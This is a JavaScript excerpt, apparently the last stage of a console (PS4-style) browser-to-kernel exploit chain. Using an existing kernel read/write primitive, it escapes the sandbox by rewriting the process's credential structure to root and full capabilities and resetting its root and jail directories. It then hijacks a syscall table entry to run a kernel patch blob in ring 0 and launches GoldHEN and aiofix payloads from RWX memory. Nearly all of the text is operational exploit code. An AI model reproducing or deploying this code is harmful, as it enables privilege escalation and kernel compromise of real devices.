                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
                    function kview(base) {
                        return {
                            getBInt: o => kv.read8(base.add32(o)),
                            setBInt: function (o, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(base.add32(o), kvwAddr, 8); },
                            getInt32: function (o) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, base.add32(o), 4); return kvwDv.getInt32(0, true); },
                            setInt32: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setInt32(0, v, true); kv.kwrite(base.add32(o), kvwAddr, 4); },
                            setUint8: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setUint8(0, v); kv.kwrite(base.add32(o), kvwAddr, 1); },
                        };
                    }
                    const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
                    const fget = fd => kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                    function fput(fd, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8); }
                    function fhold(fp) {
                        const before = kview(fp).getInt32(0x28);
                        if (before <= 0 || before > 0xffff) return { before, after: before };
                        let after = before;
                        for (let bump = 1; bump <= 4; ++bump) { kview(fp).setInt32(0x28, before + bump); after = kview(fp).getInt32(0x28); if (after > before && after >= 2) break; }
                        return { before, after };
                    }
                    {
                        const held = []; let allOk = true;
                        for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) {
                            const fp = fget(fd);
                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
                            const r = fhold(fp);
                            if (!(r.after > r.before)) allOk = false;
                            held.push(fd + ":" + r.before + "->" + r.after);
                        }
                        mark("PIPE-REFCNT", held.join(" "));
                        check("four-karw-pipe-files-hold", allOk, "");
                    }

                    let jailbroken = false, curproc = null;
                    if (CFG_DO_JAILBREAK === 1) try {
                        const FIOSETOWN = 0x8004667c;
                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                        state("sandbox escape...", "warn");
                        {
                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                const escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                                lenDv.setUint32(0, pid, true);
                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                                const escFp = fget(escPipe[0]);
                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                                const sigio = kptr2(escData) ? kv.read8(escData.add32(0xd0)) : null;
                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                                sc(SYS.close, escPipe[1]); sc(SYS.close, escPipe[0]);
                            }
                            check("curproc-resolved-through-pipe-sigio", kptr2(curproc), "" + (curproc || "null"));
                        }
                        if (kptr2(curproc)) {
                            function pfind(target) {
                                let q = kv.read8(curproc);
                                for (let n = 0; n < 4096; ++n) { if (!kptr2(q)) return null; if (kview(q).getInt32(P_PID) === target) return q; q = kv.read8(q.add32(P_LIST_NEXT)); }
                                return null;
                            }
                            const kProc = pfind(0);
                            const procFd = kv.read8(curproc.add32(P_FD));
                            const ucred = kv.read8(curproc.add32(P_UCRED));
                            const prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
                            const rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
                            const srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
                            if (check("jailbreak-source-kernel-pointer", srcOk, srcOk ? "" : "refusing to write")) {
                                kview(ucred).setInt32(CR_UID, 0);
                                kview(ucred).setInt32(CR_RUID, 0);
                                kview(ucred).setInt32(CR_SVUID, 0);
                                kview(ucred).setInt32(CR_NGROUPS, 1);
                                kview(ucred).setInt32(CR_RGID, 0);
                                kview(ucred).setBInt(CR_PRISON, prison0);
                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                                kview(procFd).setBInt(FD_RDIR, rootVnode);
                                kview(procFd).setBInt(FD_JDIR, rootVnode);
                                const uidNow = sc(SYS.getuid).i32;
                                jailbroken = uidNow === 0;
                                mark("JAILBROKEN", "uid=" + uidNow);
                                check("kernel-reports-root", jailbroken, "getuid=" + uidNow);
                            }
                        }
                    } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }

                    let kpatched = false;
                    if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
                        state("kernel patches...", "warn");
                        const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                        const sysent = kernelBase.add32(off.k_sysent_661);
                        const gadget = kernelBase.add32(off.k_jmp_rsi);
                        const gb = [];
                        for (let i = 0; i < 4; ++i) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, gadget.add32(i), 1); gb.push(kvwDv.getUint8(0)); }
                        mark("JMP-RSI-BYTES", gadget + " -> " + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));
                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
                        const oNarg = kview(sysent).getInt32(SYSENT_NARG);
                        const oCall = kview(sysent).getBInt(SYSENT_CALL);
                        const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);
                        const siteBytes = []; let sitesOk = true;
                        for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); const b = kvwDv.getUint8(0); siteBytes.push(hx(s) + ":" + b.toString(16)); if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false; }
                        check("gadget-sysent661-patch-sites-look-right", gadgetOk && sysentOk && sitesOk, "gadget=" + gadgetOk + " sysent=" + sysentOk + " sites=" + sitesOk);
                        if (gadgetOk && sysentOk && sitesOk) {
                            const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
                            const KEXEC_MAP = new int64(0x20100000, 9);
                            const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
                            const mapAddr = new int64(mapped.lo, mapped.hi);
                            if (mapAddr.hi > 0) {
                                for (let i = 0; i < kpatch.length; ++i) p.write1(mapAddr.add32(i), kpatch[i]);
                                let copied = true;
                                for (let i = 0; i < kpatch.length; ++i) if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
                                check("blob-rwx-memory-byte-byte", copied, kpatch.length + " bytes");
                                if (copied) {
                                    kview(sysent).setInt32(SYSENT_NARG, 2);
                                    kview(sysent).setBInt(SYSENT_CALL, gadget);
                                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
                                    const armedOk = kview(sysent).getBInt(SYSENT_CALL).low === gadget.low;
                                    if (armedOk) {
                                        let rc = -1;
                                        try { rc = sc(SYS.kexec, mapAddr).i32; }
                                        finally {
                                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
                                            kview(sysent).setBInt(SYSENT_CALL, oCall);
                                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                                        }
                                        let allEb = true;
                                        for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); if (kvwDv.getUint8(0) !== 0xeb) allEb = false; }
                                        kpatched = rc === 0 && allEb;
                                        check("gated-site-reads-0xeb", allEb, "");
                                        check("blob-ran-ring-0", rc === 0, "kexec=" + rc);
                                        if (kpatched) mark("KERNEL-PATCHED", "sites=" + KPATCH_JMP_SITES.length);
                                    }
                                }
                            }
                        }
                    } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }

                    // ============================================================
                    // PAYLOAD: aiofix primero, GoldHEN después
                    // ============================================================
                    let payloadRunning = false;
                    let aiofixRan = false;

                    if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {

                        // ETAPA 1: aiofix
                        if (aiofix && aiofix.length > 0) {
                            state("running aiofix...", "warn");
                            const asz = (aiofix.length + 0x3fff) & ~0x3fff;
                            const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
                            const aEntry = new int64(am.lo, am.hi);
                            mark("AIOFIX-MAP", "size=0x" + asz.toString(16) + " rwx=" + aEntry);
                            if (aEntry.hi > 0) {
                                for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
                                let aBad = -1;
                                for (let i = 0; i < aiofix.length; ++i)
                                    if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
                                check("aiofix-byte-rwx-memory", aBad < 0, aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
                                if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
                                    const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                    const fn = p.read8(slot);
                                    const expect = libkernelBase.add32(off.k_pthread_create);
                                    const agree = fn.low === expect.low && fn.hi === expect.hi;
                                    if (agree) {
                                        const aThr = new ArrayBuffer(8); keepAlive.push(aThr);
                                        const aThrAddr = bufAddr(aThr);
                                        new Uint8Array(aThr).fill(0);
                                        const aRc = callAddr(expect, [aThrAddr, 0, aEntry, 0]).i32;
                                        const aHandle = new int64(new DataView(aThr).getUint32(0, true), new DataView(aThr).getUint32(4, true));
                                        aiofixRan = aRc === 0 && aHandle.hi > 0;
                                        mark("AIOFIX-THREAD", "rc=" + aRc + " handle=" + aHandle);
                                        check("aiofix-thread-created", aiofixRan, "");
                                        if (aiofixRan) {
                                            mark("AIOFIX-RUNNING", "bytes=" + aiofix.length + " entry=" + aEntry);
                                            mark("AIOFIX-SETTLE", "esperando 1500ms");
                                            nanosleepMs(1500);
                                        }
                                    }
                                }
                            }
                        } else {
                            mark("AIOFIX-SKIPPED", "no aiofix cargado");
                        }

                        // ETAPA 2: GoldHEN
                        if (payload) {
                            state("running GoldHEN payload...", "warn");
                            const sz = (payload.length + 0x3fff) & ~0x3fff;
                            const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                            const entry = new int64(m.lo, m.hi);
                            mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
                            if (entry.hi > 0) {
                                for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
                                let bad = -1;
                                for (let i = 0; i < payload.length; ++i)
                                    if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                                check("byte-payload-rwx-memory", bad < 0, bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
                                if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                    const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                    const fn = p.read8(slot);
                                    const expect = libkernelBase.add32(off.k_pthread_create);
                                    const agree = fn.low === expect.low && fn.hi === expect.hi;
                                    mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
                                    if (agree) {
                                        const thr = new ArrayBuffer(8); keepAlive.push(thr);
                                        const thrAddr = bufAddr(thr);
                                        new Uint8Array(thr).fill(0);
                                        const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
                                        const handle = new int64(new DataView(thr).getUint32(0, true), new DataView(thr).getUint32(4, true));
                                        payloadRunning = rc === 0 && handle.hi > 0;
                                        mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
                                        check("payload-thread-created", payloadRunning, "");
                                        if (payloadRunning) mark("PAYLOAD-RUNNING",
                                            "bytes=" + payload.length + " entry=" + entry
                                            + " aiofix_before=" + aiofixRan);
                                    }
                                }
                            }
                        }
                    }

                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                        + " kpatched=" + kpatched
                        + " aiofix=" + aiofixRan
                        + " payload=" + payloadRunning);

                    if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 aiofix=" + aiofixRan + " payload=1"); }
                    else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
                    else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=0");
                    else mark("SAFE-TO-EXIT", "karw=1 only");
                }
            }
        }

        mark("STEP10-SUMMARY-FINAL", "committed=" + committed + " reboot=" + rebootRequired
            + " triplets=" + (triplets ? triplets.join(",") : "none")
            + " kernel_base=" + (kernelBase || "none")
            + " kv=" + (kv ? "up" : "down"));

        state(allDone ? "BERHASIL -- Tekan tombol PS untuk keluar"
              : kv ? "KERNEL R/W OK -- ver log"
              : kernelBase ? "make_karw parcial -- ver log"
              : "Sin triple free -- reboot",
              allDone ? "ok" : kv ? "warn" : "bad");
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
    } finally {
        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
        try {
            if (sc) {
                const closeAll = (list, tag) => {
                    if (!list) return;
                    let n = 0;
                    for (const fd of list) { if (typeof fd !== "number" || fd <= 2) continue; try { if (sc(SYS.close, fd).i32 === 0) n++; } catch (_) { } }
                    if (n) mark(tag, "closed=" + n);
                };
                try { closeAll(_ipv6, "IPV6-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_iovSs, "IOVSS-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_uioSs, "UIOSS-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_masterPipe, "MPIPE-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_slavePipe, "SPIPE-CLOSED-FALLBACK"); } catch (_) { }
                try { if (uafSock) { sc(SYS.close, uafSock); uafSock = 0; } } catch (_) { }
            }
        } catch (e) { mark("FD-CLEANUP-FAILED", e.message); }

        try { if (restoreCtx) await restoreCtx.restore("finally"); } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        for (const w of workers) { try { if (w.armed) { await w.rpc("disarm", 3000); w.armed = false; } } catch (e) { mark("DISARM-THREW", w.name + " " + e.message); } }
        for (const w of workers) { try { if (w.wired && w.master && w.origVector && p) { p.write8(w.master.add32(0x10), w.origVector); w.wired = false; } } catch (e) { } }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1)); } } catch (e) { mark("DISARM-THREW", e.message); }

        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
    }
})();